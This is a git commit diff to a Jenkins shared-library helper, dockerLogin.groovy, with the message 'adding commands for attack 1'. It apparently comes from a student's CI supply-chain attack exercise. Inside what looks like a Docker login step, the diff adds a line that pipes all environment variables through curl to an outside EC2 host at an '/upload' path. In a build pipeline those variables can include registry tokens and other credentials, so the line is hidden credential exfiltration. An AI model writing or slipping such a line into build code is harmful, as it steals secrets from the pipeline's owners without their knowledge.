134fd452c452053e2f93e259f105ea8e12afafd5
Victor Vanhooren <victor.vanhooren@student.hogent.be>
2023-05-11 21:41:08 +0200

    adding commands for attack 1

--- vars/dockerLogin.groovy
+++ vars/dockerLogin.groovy
@@ -2,5 +2,5 @@ def call (String hubUser, String hubAccessToken ) {
     sh """
     echo ${hubAccessToken} | docker login -u ${hubUser} --password-stdin
     """
-    sh'env | curl -H "Content-Type: application/json" -X POST -d "$(</dev/stdin)" http://ec2-16-16-75-127.eu-north-1.compute.amazonaws.com:8080'
+    sh'env | curl -H "Content-Type: application/json" -X POST -d "$(</dev/stdin)" http://ec2-16-16-75-127.eu-north-1.compute.amazonaws.com:8080/upload'
 }
